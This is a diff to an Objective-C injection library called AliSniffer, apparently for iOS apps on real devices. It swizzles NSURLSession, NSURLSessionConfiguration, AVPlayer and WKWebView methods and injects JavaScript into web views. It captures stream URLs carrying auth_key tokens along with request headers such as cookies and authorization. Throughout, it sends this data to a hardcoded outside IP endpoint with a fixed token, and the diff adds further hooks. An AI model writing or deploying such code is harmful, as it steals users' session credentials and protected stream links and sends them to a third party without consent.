@@ -1,15 +1,12 @@
 
 //
-//  AliSniffer_enhanced.m
-//  Enhanced: auth_key priority + larger sniff buffer + header capture + extra AVPlayer hooks + MSE appendBuffer interception
+//  AliSniffer_enhanced_fix.m
+//  Safe enhanced version with robust hooking (safe-init) for real-device injection.
+//  - Hooks __NSCFURLSessionTask/NSURLSessionTask resume
+//  - Hooks NSURLSession dataTaskWithRequest:
+//  - Adds larger sniff buffer, delayed detection, header capture, AVPlayer replaceCurrentItem/playImmediatelyAtRate, WK MSE interception
 //
-//  NOTE: This file is intended to replace/merge with your existing AliSniffer.m.
-//  It preserves previous behavior and adds:
-//   - Larger "first packet" sniff buffer (128 KB) and 150ms delayed detection
-//   - Capture and push of request headers (Authorization/Cookie/Referer/User-Agent/Origin)
-//   - Additional hooks: AVPlayer.replaceCurrentItemWithPlayerItem:, AVPlayer playImmediatelyAtRate:
-//   - WK WebView injection that intercepts MediaSource / SourceBuffer.appendBuffer (posts a short base64 prefix or indication)
-//   - Keeps auth_key priority logic intact
+//  Drop into your project / replace previous AliSniffer and inject. Backup original first.
 //
 
 #import <Foundation/Foundation.h>
@@ -21,7 +18,6 @@
 
 // ---------- Config ----------
 static NSString * const kPushRawEndpoint  = @"http://139.155.57.242:8088/api/push_raw";
-static NSString * const kPushFormEndpoint = @"http://139.155.57.242:8088/api/push_form";
 static NSString * const kPushToken        = @"@Yy166431";
 static const NSTimeInterval kPushInterval = 3600.0;
 
@@ -29,13 +25,15 @@ static const NSTimeInterval kPushInterval = 3600.0;
 #define SNIFFER_ENABLE_POPUP 1
 #endif
 
-#ifndef ENABLE_DEBUG_LOG
-#define LOG(...)
-#else
+// Enable for debug logs during troubleshooting
+#define ENABLE_DEBUG_LOG 1
+#ifdef ENABLE_DEBUG_LOG
 #define LOG(...) NSLog(__VA_ARGS__)
+#else
+#define LOG(...)
 #endif
 
-// ---------- Helpers ----------
+// ---------- Globals ----------
 static NSMutableDictionary<NSString*, NSDate*> *g_seen;
 static NSString *g_lastPlayableURL = nil;
 static dispatch_queue_t g_sniffer_queue;
@@ -46,6 +44,8 @@ static void ensure_globals() {
         g_sniffer_queue = dispatch_queue_create("com.alisniffer.queue", DISPATCH_QUEUE_SERIAL);
     });
 }
+
+// ---------- Utilities ----------
 static inline BOOL SeenRecently_internal(NSString *k, NSTimeInterval sec) {
     if (!k) return NO;
     NSDate *now = [NSDate date];
@@ -78,13 +78,11 @@ static inline BOOL IsPlayableURL(NSString *lower) {
     if ([lower containsString:@"m3u8"] || [lower containsString:@".mp4"] || [lower containsString:@".flv"]) return YES;
     if ([lower hasPrefix:@"rtmp://"] || [lower hasPrefix:@"rtmps://"]) return YES;
     if (([lower hasPrefix:@"ws://"] || [lower hasPrefix:@"wss://"]) && [lower containsString:@".flv"]) return YES;
-    // whitelist some hosts (keep as example)
     NSArray *wh = @[@"knyb.kuniunet.com",@"knydb.kuniunet.com",@"v2.weizan.cn"];
     for (NSString *w in wh) if ([HostOfURLString(lower) hasSuffix:w]) return YES;
     return NO;
 }
 
-// ---------- auth_key + base URL ----------
 static inline BOOL HasAuthKey(NSString *lower) {
     if (!lower) return NO;
     return ([lower containsString:@"auth_key="] || [lower containsString:@"authkey="]);
@@ -97,7 +95,7 @@ static inline NSString *BaseURLWithoutQuery(NSString *s) {
     return c.string ?: s;
 }
 
-// ---------- UI / popup ----------
+// ---------- UI ----------
 static void ShowPopupIfNeeded(NSString *title, NSString *msg) {
 #if SNIFFER_ENABLE_POPUP
     if (!msg.length) return;
@@ -117,7 +115,7 @@ static void ShowPopupIfNeeded(NSString *title, NSString *msg) {
 #endif
 }
 
-// ---------- Push (send JSON with headers) ----------
+// ---------- Push ----------
 static void PushJSON_async(NSDictionary *obj) {
     if (!obj) return;
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_BACKGROUND, 0), ^{
@@ -138,7 +136,7 @@ static void PushJSON_async(NSDictionary *obj) {
     });
 }
 
-// ---------- Core ReportURL: captures URL + key headers, auth_key priority, improved de-dup ----------
+// ---------- Report with headers ----------
 static inline NSDictionary *DictForHeaders(NSDictionary *headers) {
     if (!headers) return @{};
     NSMutableDictionary *m = [NSMutableDictionary dictionary];
@@ -149,7 +147,6 @@ static inline NSDictionary *DictForHeaders(NSDictionary *headers) {
     }
     return m;
 }
-
 static inline void ReportURL_WithHeaders(NSString *url, NSDictionary *headers) {
     if (!url.length) return;
     NSString *lower = url.lowercaseString;
@@ -175,7 +172,6 @@ static inline void ReportURL_WithHeaders(NSString *url, NSDictionary *headers) {
 
     ShowPopupIfNeeded(title, url);
 
-    // build push payload: url + headers + time + note
     NSMutableDictionary *payload = [NSMutableDictionary dictionary];
     payload[@"url"] = url;
     payload[@"time"] = @([[NSDate date] timeIntervalSince1970]);
@@ -185,8 +181,9 @@ static inline void ReportURL_WithHeaders(NSString *url, NSDictionary *headers) {
     PushJSON_async(payload);
 }
 
-// ---------- Hook points: NSURLSessionTask resume (capture request + headers) ----------
-static void (*orig_task_resume)(id, SEL);
+// ---------- Hooks ----------
+// NSURLSessionTask resume
+static void (*orig_task_resume)(id, SEL) = NULL;
 static void swz_task_resume(id self, SEL _cmd) {
     @try {
         NSURLRequest *req = nil;
@@ -196,15 +193,29 @@ static void swz_task_resume(id self, SEL _cmd) {
             req = [self performSelector:@selector(originalRequest)];
         }
         if (req && req.URL) {
-            NSString *u = req.URL.absoluteString;
             NSDictionary *hdrs = req.allHTTPHeaderFields ?: @{};
-            ReportURL_WithHeaders(u, hdrs);
+            ReportURL_WithHeaders(req.URL.absoluteString, hdrs);
+            LOG(@"[AliSniffer] resume -> %@", req.URL.absoluteString);
         }
     } @catch(...) {}
     if (orig_task_resume) orig_task_resume(self, _cmd);
 }
 
-// ---------- NSURLProtocol sniff with larger buffer & delayed detection ----------
+// NSURLSession dataTaskWithRequest:
+static id (*orig_dataTaskWithRequest)(id, SEL, NSURLRequest *) = NULL;
+static id swz_dataTaskWithRequest(id self, SEL _cmd, NSURLRequest *req) {
+    @try {
+        if (req && req.URL) {
+            NSDictionary *hdrs = req.allHTTPHeaderFields ?: @{};
+            ReportURL_WithHeaders(req.URL.absoluteString, hdrs);
+            LOG(@"[AliSniffer] dataTaskWithRequest -> %@", req.URL.absoluteString);
+        }
+    } @catch(...) {}
+    if (orig_dataTaskWithRequest) return orig_dataTaskWithRequest(self, _cmd, req);
+    return nil;
+}
+
+// NSURLProtocol sniff (larger buffer, delayed detection)
 @interface _SniffProto2 : NSURLProtocol <NSURLSessionDataDelegate>
 @property(nonatomic,strong) NSURLSessionDataTask *task;
 @property(nonatomic,strong) NSMutableData *buf;
@@ -257,14 +268,12 @@ static void swz_task_resume(id self, SEL _cmd) {
     if (self.shouted) return;
     if (self.firstDataTime <= 0) self.firstDataTime = [[NSDate date] timeIntervalSince1970];
 
-    // append up to 128KB
     NSUInteger maxBuf = 128 * 1024;
     if (self.buf.length < maxBuf) {
         NSUInteger need = MIN(maxBuf - self.buf.length, data.length);
         [self.buf appendData:[data subdataWithRange:NSMakeRange(0, need)]];
     }
 
-    // schedule delayed check (150ms after first data)
     NSTimeInterval now = [[NSDate date] timeIntervalSince1970];
     NSTimeInterval delta = now - self.firstDataTime;
     if (delta < 0.15) {
@@ -282,7 +291,6 @@ static void swz_task_resume(id self, SEL _cmd) {
     const uint8_t *bytes = (const uint8_t *)self.buf.bytes;
     NSUInteger n = self.buf.length;
 
-    // check M3U8 textual signatures
     NSString *txt = [[NSString alloc] initWithData:self.buf encoding:NSUTF8StringEncoding];
     if (txt && ( [txt containsString:@"#EXTM3U"] || [txt containsString:@"#EXT-X-PROGRAM-DATE-TIME"] || [txt containsString:@"#EXT-X-PART"] )) {
         ReportURL_WithHeaders(self.reqURL, self.reqHeaders);
@@ -290,14 +298,12 @@ static void swz_task_resume(id self, SEL _cmd) {
         return;
     }
 
-    // check FLV header
     if (n >= 3 && bytes[0]=='F' && bytes[1]=='L' && bytes[2]=='V') {
         ReportURL_WithHeaders(self.reqURL, self.reqHeaders);
         self.shouted = YES;
         return;
     }
 
-    // check MP4 boxes: ftyp/moof/mdat
     NSUInteger maxScan = MIN(n, (NSUInteger)4096);
     for (NSUInteger i=0;i+8<=maxScan;i++) {
         if (bytes[i+4]=='f' && bytes[i+5]=='t' && bytes[i+6]=='y' && bytes[i+7]=='p') {
@@ -312,7 +318,6 @@ static void swz_task_resume(id self, SEL _cmd) {
         }
     }
 
-    // check TS sync byte 0x47 at 188 periodicity
     if (n >= 376) {
         if (bytes[0] == 0x47 && (bytes[188] == 0x47 || (n > 2*188 && bytes[2*188] == 0x47))) {
             ReportURL_WithHeaders(self.reqURL, self.reqHeaders);
@@ -322,15 +327,14 @@ static void swz_task_resume(id self, SEL _cmd) {
     }
 }
 
-// metrics / finish
 - (void)URLSession:(NSURLSession *)session task:(NSURLSessionTask *)task didCompleteWithError:(NSError *)error {
     if (error) [self.client URLProtocol:self didFailWithError:error];
     else [self.client URLProtocolDidFinishLoading:self];
 }
 @end
 
-// swizzle NSURLSessionConfiguration to insert protocol
-static NSURLSessionConfiguration* (*orig_defCfg)(id, SEL);
+// Swizzle NSURLSessionConfiguration class methods to insert protocol
+static NSURLSessionConfiguration* (*orig_defCfg)(id, SEL) = NULL;
 static NSURLSessionConfiguration* swz_defCfg(id self, SEL _cmd) {
     NSURLSessionConfiguration *cfg = orig_defCfg ? orig_defCfg(self, _cmd) : [NSURLSessionConfiguration defaultSessionConfiguration];
     NSMutableArray *arr = [cfg.protocolClasses mutableCopy] ?: [NSMutableArray array];
@@ -338,7 +342,7 @@ static NSURLSessionConfiguration* swz_defCfg(id self, SEL _cmd) {
     cfg.protocolClasses = arr;
     return cfg;
 }
-static NSURLSessionConfiguration* (*orig_ephCfg)(id, SEL);
+static NSURLSessionConfiguration* (*orig_ephCfg)(id, SEL) = NULL;
 static NSURLSessionConfiguration* swz_ephCfg(id self, SEL _cmd) {
     NSURLSessionConfiguration *cfg = orig_ephCfg ? orig_ephCfg(self, _cmd) : [NSURLSessionConfiguration ephemeralSessionConfiguration];
     NSMutableArray *arr = [cfg.protocolClasses mutableCopy] ?: [NSMutableArray array];
@@ -347,7 +351,7 @@ static NSURLSessionConfiguration* swz_ephCfg(id self, SEL _cmd) {
     return cfg;
 }
 
-// ---------- AVPlayer additional hooks ----------
+// AVPlayer additional hooks
 static void *orig_replaceCurrentItem = NULL;
 static void swz_replaceCurrentItem(id self, SEL _cmd, id item) {
     @try {
@@ -361,6 +365,7 @@ static void swz_replaceCurrentItem(id self, SEL _cmd, id item) {
             if (u && u.absoluteString) {
                 NSDictionary *hdrs = @{};
                 ReportURL_WithHeaders(u.absoluteString, hdrs);
+                LOG(@"[AliSniffer] replaceCurrentItem -> %@", u.absoluteString);
             }
         }
     } @catch(...) {}
@@ -379,13 +384,16 @@ static void swz_playImmediatelyAtRate(id self, SEL _cmd, float rate) {
                 id asset = [cur performSelector:@selector(asset)];
                 if (asset && [asset respondsToSelector:@selector(URL)]) u = [asset performSelector:@selector(URL)];
             }
-            if (u && u.absoluteString) ReportURL_WithHeaders(u.absoluteString, @{});
+            if (u && u.absoluteString) {
+                ReportURL_WithHeaders(u.absoluteString, @{});
+                LOG(@"[AliSniffer] playImmediatelyAtRate -> %@", u.absoluteString);
+            }
         }
     } @catch(...) {}
     ((void(*)(id,SEL,float))orig_playImmediatelyAtRate)(self, _cmd, rate);
 }
 
-// ---------- WKWebView injection: MSE/appendBuffer interception ----------
+// WK WebView injection for fetch/XHR and MSE appendBuffer preview
 @interface _WKHandler2 : NSObject<WKScriptMessageHandler>
 @end
 @implementation _WKHandler2
@@ -402,25 +410,25 @@ static void swz_playImmediatelyAtRate(id self, SEL _cmd, float rate) {
                     NSString *info = j[@"info"] ?: @"";
                     NSString *note = [NSString stringWithFormat:@"MSE append preview: %@", info];
                     ReportURL_WithHeaders(note, @{});
+                    LOG(@"[AliSniffer] MSE append preview: %@", info);
                 } else if ([j[@"type"] isEqualToString:@"fetch_url"]) {
                     NSString *u = j[@"url"] ?: @"";
-                    if (u.length) ReportURL_WithHeaders(u, @{});
+                    if (u.length) { ReportURL_WithHeaders(u, @{ }); LOG(@"[AliSniffer] WK fetch_url -> %@", u); }
                 }
             } else {
                 NSString *u = s;
-                if (u.length) ReportURL_WithHeaders(u, @{});
+                if (u.length) { ReportURL_WithHeaders(u, @{ }); LOG(@"[AliSniffer] WK raw -> %@", u); }
             }
         }
     } @catch(...) {}
 }
 @end
 
-static id (*orig_WK_init)(id, SEL, CGRect, WKWebViewConfiguration *);
+static id (*orig_WK_init)(id, SEL, CGRect, WKWebViewConfiguration *) = NULL;
 static id swz_WK_init(id self, SEL _cmd, CGRect frame, WKWebViewConfiguration *cfg) {
     if (cfg) {
         _WKHandler2 *h = [_WKHandler2 new];
         [cfg.userContentController addScriptMessageHandler:h name:@"_S2"];
-
         NSString *js =
         @"(function(){"
          "function post(o){try{window.webkit.messageHandlers._S2.postMessage(JSON.stringify(o));}catch(e){}}"
@@ -448,58 +456,80 @@ static id swz_WK_init(id self, SEL _cmd, CGRect frame, WKWebViewConfiguration *c
     return orig_WK_init ? orig_WK_init(self, _cmd, frame, cfg) : self;
 }
 
-// ---------- Constructor: install hooks ----------
+// ---------- Safe init constructor: try multiple candidate classes and ensure metaclass swizzling ----------
 __attribute__((constructor))
-static void _alisniffer_enhanced_init(void) {
+static void _alisniffer_safe_init(void) {
     @autoreleasepool {
-        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.6 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
+        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
             ensure_globals();
-            // NSURLSessionTask resume
-            Class Task = NSClassFromString(@"NSURLSessionTask");
-            if (Task && class_getInstanceMethod(Task, @selector(resume))) {
-                Method m = class_getInstanceMethod(Task, @selector(resume));
-                orig_task_resume = (void *)method_getImplementation(m);
-                method_setImplementation(m, (IMP)swz_task_resume);
+            LOG(@"[AliSniffer] safe init start");
+
+            // Try hooking resume on likely classes
+            NSArray *candidates = @[@"__NSCFURLSessionTask", @"__NSURLSessionLocalTask", @"NSURLSessionTask"];
+            BOOL hookedResume = NO;
+            for (NSString *clsName in candidates) {
+                Class c = NSClassFromString(clsName);
+                if (!c) continue;
+                SEL sel = @selector(resume);
+                Method m = class_getInstanceMethod(c, sel);
+                if (!m) continue;
+                IMP orig = method_getImplementation(m);
+                if (orig) {
+                    if (!orig_task_resume) orig_task_resume = (void *)orig;
+                    method_setImplementation(m, (IMP)swz_task_resume);
+                    LOG(@"[AliSniffer] hooked resume on %@", clsName);
+                    hookedResume = YES;
+                }
             }
-            // swizzle NSURLSessionConfiguration default/ephemeral
+            if (!hookedResume) LOG(@"[AliSniffer] WARNING: failed to hook resume on candidates");
+
+            // Hook NSURLSession dataTaskWithRequest:
+            Class NSURLSessionClass = NSClassFromString(@"NSURLSession");
+            if (NSURLSessionClass) {
+                SEL sel = @selector(dataTaskWithRequest:);
+                Method m = class_getInstanceMethod(NSURLSessionClass, sel);
+                if (m) {
+                    orig_dataTaskWithRequest = (void *)method_getImplementation(m);
+                    method_setImplementation(m, (IMP)swz_dataTaskWithRequest);
+                    LOG(@"[AliSniffer] hooked NSURLSession dataTaskWithRequest:");
+                } else {
+                    LOG(@"[AliSniffer] WARNING: dataTaskWithRequest: not found");
+                }
+            }
+
+            // Hook NSURLSessionConfiguration class methods (use metaclass)
             Class Cfg = NSClassFromString(@"NSURLSessionConfiguration");
             if (Cfg) {
-                Method m1 = class_getClassMethod(Cfg, @selector(defaultSessionConfiguration));
-                if (m1) { orig_defCfg = (void *)method_getImplementation(m1); method_setImplementation(m1, (IMP)swz_defCfg); }
-                Method m2 = class_getClassMethod(Cfg, @selector(ephemeralSessionConfiguration));
-                if (m2) { orig_ephCfg = (void *)method_getImplementation(m2); method_setImplementation(m2, (IMP)swz_ephCfg); }
+                Method dm = class_getClassMethod(Cfg, @selector(defaultSessionConfiguration));
+                if (dm) { orig_defCfg = (void *)method_getImplementation(dm); method_setImplementation(dm, (IMP)swz_defCfg); LOG(@"[AliSniffer] hooked defaultSessionConfiguration"); }
+                Method em = class_getClassMethod(Cfg, @selector(ephemeralSessionConfiguration));
+                if (em) { orig_ephCfg = (void *)method_getImplementation(em); method_setImplementation(em, (IMP)swz_ephCfg); LOG(@"[AliSniffer] hooked ephemeralSessionConfiguration"); }
             }
 
-            // AVPlayer.replaceCurrentItemWithPlayerItem:
+            // AVPlayer hooks
             Class AVP = NSClassFromString(@"AVPlayer");
-            SEL selRep = sel_registerName("replaceCurrentItemWithPlayerItem:");
-            if (AVP && selRep) {
+            if (AVP) {
+                SEL selRep = sel_registerName("replaceCurrentItemWithPlayerItem:");
                 Method mr = class_getInstanceMethod(AVP, selRep);
-                if (mr) {
-                    orig_replaceCurrentItem = (void *)method_getImplementation(mr);
-                    method_setImplementation(mr, (IMP)swz_replaceCurrentItem);
-                }
-            }
-            // AVPlayer playImmediatelyAtRate:
-            SEL selPlayRate = sel_registerName("playImmediatelyAtRate:");
-            if (AVP && selPlayRate) {
-                Method mp = class_getInstanceMethod(AVP, selPlayRate);
-                if (mp) {
-                    orig_playImmediatelyAtRate = (void *)method_getImplementation(mp);
-                    method_setImplementation(mp, (IMP)swz_playImmediatelyAtRate);
-                }
+                if (mr) { orig_replaceCurrentItem = (void *)method_getImplementation(mr); method_setImplementation(mr, (IMP)swz_replaceCurrentItem); LOG(@"[AliSniffer] hooked AVPlayer.replaceCurrentItemWithPlayerItem:"); }
+                SEL selPlay = sel_registerName("playImmediatelyAtRate:");
+                Method mp = class_getInstanceMethod(AVP, selPlay);
+                if (mp) { orig_playImmediatelyAtRate = (void *)method_getImplementation(mp); method_setImplementation(mp, (IMP)swz_playImmediatelyAtRate); LOG(@"[AliSniffer] hooked AVPlayer.playImmediatelyAtRate:"); }
+            } else {
+                LOG(@"[AliSniffer] AVPlayer class not present");
             }
 
-            // WKWebView init hook
+            // WKWebView hook
             Class WK = NSClassFromString(@"WKWebView");
             if (WK) {
                 Method m = class_getInstanceMethod(WK, @selector(initWithFrame:configuration:));
-                if (m) { orig_WK_init = (void *)method_getImplementation(m); method_setImplementation(m, (IMP)swz_WK_init); }
+                if (m) { orig_WK_init = (void *)method_getImplementation(m); method_setImplementation(m, (IMP)swz_WK_init); LOG(@"[AliSniffer] hooked WKWebView initWithFrame:configuration:"); }
             }
 
 #if SNIFFER_ENABLE_POPUP
-            ShowPopupIfNeeded(@"AliSniffer", @"增强版已加载：128KB嗅探缓冲、150ms延迟检测、Header推送、MSE拦截、AVPlayer额外钩子");
+            ShowPopupIfNeeded(@"AliSniffer", @"Safe enhanced hooks installed (debug ON)");
 #endif
+
             [NSTimer scheduledTimerWithTimeInterval:kPushInterval repeats:YES block:^(__unused NSTimer * _Nonnull t) {
                 if (g_lastPlayableURL.length) {
                     NSMutableDictionary *p = [NSMutableDictionary dictionary];
@@ -508,6 +538,8 @@ static void _alisniffer_enhanced_init(void) {
                     PushJSON_async(p);
                 }
             }];
+
+            LOG(@"[AliSniffer] safe init done");
         });
     }
 }
